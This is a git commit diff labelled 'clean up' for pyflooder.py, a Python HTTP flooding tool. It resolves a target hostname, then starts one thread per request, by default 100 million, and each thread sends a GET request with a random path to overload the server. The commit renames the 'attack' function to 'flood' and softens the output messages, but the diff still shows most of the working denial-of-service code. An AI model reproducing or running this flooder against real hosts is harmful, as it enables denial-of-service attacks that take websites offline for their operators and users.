1d8ed6ca39bf899533d39b30aeaa1bab24d74438
Eric Baptista <Eric Baptista>
2023-08-30 17:30:18 +0200

    clean up

--- pyflooder.py
+++ pyflooder.py
@@ -12,12 +12,12 @@ import sys
 import threading
 import time
 
-# Parse inputs
 host = ""
 ip = ""
 port = 0
 num_requests = 0
 
+# Parse inputs
 if len(sys.argv) == 2:
     port = 80
     num_requests = 100000000
@@ -28,7 +28,7 @@ elif len(sys.argv) == 4:
     port = int(sys.argv[2])
     num_requests = int(sys.argv[3])
 else:
-    print (f"ERROR\n Usage: {sys.argv[0]} < Hostname > < Port > < Number_of_Attacks >")
+    print(f"ERROR\n Usage: {sys.argv[0]} < Hostname > < Port > < Number_of_Requests >")
     sys.exit(1)
 
 # Convert FQDN to IP
@@ -36,10 +36,10 @@ try:
     host = str(sys.argv[1]).replace("https://", "").replace("http://", "").replace("www.", "")
     ip = socket.gethostbyname(host)
 except socket.gaierror:
-    print (" ERROR\n Make sure you entered a correct website")
+    print(" ERROR: Make sure you entered a correct website")
     sys.exit(2)
 
-# Create a shared variable for thread counts
+# Shared variable for thread counts
 thread_num = 0
 thread_num_mutex = threading.Lock()
 
@@ -51,7 +51,7 @@ def print_status():
 
     thread_num += 1
     #print the output on the sameline
-    sys.stdout.write(f"\r {time.ctime().split( )[3]} [{str(thread_num)}] #-#-# Hold Your Tears #-#-#")
+    sys.stdout.write(f"\r {time.ctime().split( )[3]} [{str(thread_num)}] #-#-# Flooding #-#-#")
     sys.stdout.flush()
     thread_num_mutex.release()
 
@@ -64,7 +64,7 @@ def generate_url_path():
 
 
 # Perform the request
-def attack():
+def flood():
     print_status()
     url_path = generate_url_path()
 
@@ -80,19 +80,19 @@ def attack():
         byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
         dos.send(byt)
     except socket.error:
-        print (f"\n [ No connection, server may be down ]: {str(socket.error)}")
+        print(f"\n [ No connection, server may be down ]: {str(socket.error)}")
     finally:
         # Close our socket gracefully
         dos.shutdown(socket.SHUT_RDWR)
         dos.close()
 
 
-print (f"[#] Attack started on {host} ({ip} ) || Port: {str(port)} || # Requests: {str(num_requests)}")
+print(f"[#] Flooding started on {host} ({ip} ) || Port: {str(port)} || # Requests: {str(num_requests)}")
 
 # Spawn a thread per request
 all_threads = []
 for i in range(num_requests):
-    t1 = threading.Thread(target=attack)
+    t1 = threading.Thread(target=flood)
     t1.start()
     all_threads.append(t1)
 
